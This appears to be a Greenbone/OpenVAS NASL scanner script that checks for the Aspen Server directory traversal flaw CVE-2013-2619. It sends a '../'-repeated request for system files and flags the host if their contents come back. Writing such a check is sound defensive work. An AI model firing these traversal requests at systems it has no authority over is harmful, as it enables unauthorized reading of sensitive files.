if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803367" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2013-2619" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-04-04 12:47:57 +0530 (Thu, 04 Apr 2013)" );
	script_name( "Aspen Sever Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/24915" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/121035" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/aspen-08-directory-traversal" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "Aspen/banner" );
	script_tag( name: "insight", value: "The flaw is due to the program not properly sanitizing user supplied input." );
	script_tag( name: "solution", value: "Upgrade to Aspen Server 0.22 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "This host is running Aspen Server and is prone to directory
  traversal vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Aspen Server version 0.8 and prior" );
	script_xref( name: "URL", value: "http://aspen.io" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(ContainsString( banner, "Server: Aspen" )){
	files = traversal_files();
	for file in keys( files ) {
		url = "/" + crap( data: "../", length: 15 ) + files[file];
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

